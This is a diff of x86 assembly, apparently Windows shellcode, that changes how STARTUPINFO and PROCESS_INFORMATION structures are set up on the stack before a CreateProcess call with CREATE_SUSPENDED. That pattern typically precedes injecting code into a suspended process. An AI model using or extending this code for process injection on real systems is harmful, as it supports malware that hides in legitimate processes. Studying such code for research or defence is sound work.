@@ -92,19 +92,21 @@ _start:
     fork:
     	; ======= Create STARTUPINFO object ==========================
 	int 3
-    	xor eax, eax					; Zero out EAX
-	xor ecx, ecx					; Zero out ECX
-	mov cl, 0x11					; EXC = 0x00000011
-	push edi					; Save EDI
-	mov edi, ebp
-	add edi, 0x40
-	rep stosd					; Load EAX (Zero) to EDI, ECX times
-	pop edi						; Restore EDI
-	lea ecx, [ebp+0x84]				; Load the address of the STARTUPINFO object
+        xor ecx, ecx                    ; Zero ECX
+        mov cl, 0x54                    ; Set the lower order bytes of ECX to 0x54 which will be used to represent the size of the STARTUPINFO and PROCESS_INFORMATION structures on the stack
+        sub esp, ecx                    ; Allocate stack space for the two structures
+        mov edi, esp                    ; set edi to point to the STARTUPINFO structure
+        push edi                        ; Preserve EDI on the stack as it will be modified by the following instructions
+        xor eax, eax                    ; Zero EAX
+        rep stosb                       ; Repeat storing zero at the buffer starting at edi until ecx is zero
+        pop edi                         ; restore EDI to its original value
+        mov byte[edi], 0x44             ; cb = 0x44 (size of the structure)
 
 	; Begin CreateProcess 
-	push ecx					; lpProcessInformation
-	push ebp					; lpStartupInfo
+        xor eax, eax                    ; Zero EAX
+        lea esi, [edi+0x44]             ; Load the effective address of the PROCESS_INFORMATION structure into ESI
+        push esi                        ; Push the pointer to the lpProcessInformation structure
+        push edi                        ; Push the pointer to the lpStartupInfo structure
 	push eax					; lpCurrentDirectory = NULL
 	push eax					; lpEnvironment = NULL
 	push 0x04					; dwCreationFlags = CREATE_SUSPENDED
